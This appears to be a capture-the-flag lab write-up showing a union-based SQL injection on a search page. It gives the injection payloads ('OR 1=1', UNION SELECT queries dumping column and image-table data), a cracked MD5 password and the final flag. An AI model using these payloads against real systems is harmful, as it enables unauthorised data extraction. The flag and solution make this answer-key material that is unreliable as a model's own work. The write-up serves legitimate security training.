# UNION BASED SQL INJECTION

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Discovery
go to
```
 http://{IP_ADDRESS}/?page=searchimg
```
tryed a simple sql statement 
```
1 OR 1=1 
The SQL above is valid and will return ALL rows from the "users" table, since OR 1=1 is always TRUE.
```

Retrieve columns names with the table they belong to:
```
1 UNION SELECT table_name,column_name FROM information_schema.COLUMNS 
```
> id, url, title, comment

the command below will retrieve all image's data
```
1 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
```

the result shows this interesting image with title (Hack me ?):

|   id    |               url                   |   title   |                                                      comment      	                                                 |
| ------- | ----------------------------------- | --------- | ---------------------------------------------------------------------------------------------------------------------- |
|   5     | borntosec.ddns.net/images.png       | Hack me ? |  If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |

following the instruction :
* analyzing the password using [cipher identifier](https://www.dcode.fr/cipher-identifier)
* decrypt the password using [md5decrypt - md5](https://md5decrypt.net/en/)
* 1928e8083cf461a51303633093573c46 gives albatroz 
* lower all the char, encrypt it using Sh256
* flag is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Helpers:
- [retrieve data from db](https://www.sqlinjection.net/table-names/)
- [dcode - cipher identifier](https://www.dcode.fr/cipher-identifier)
- [md5decrypt - md5](https://md5decrypt.net/en/)
- [sha256 - sh256](https://emn178.github.io/online-tools/sha256.html)


## Ressources
- [Owasp SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)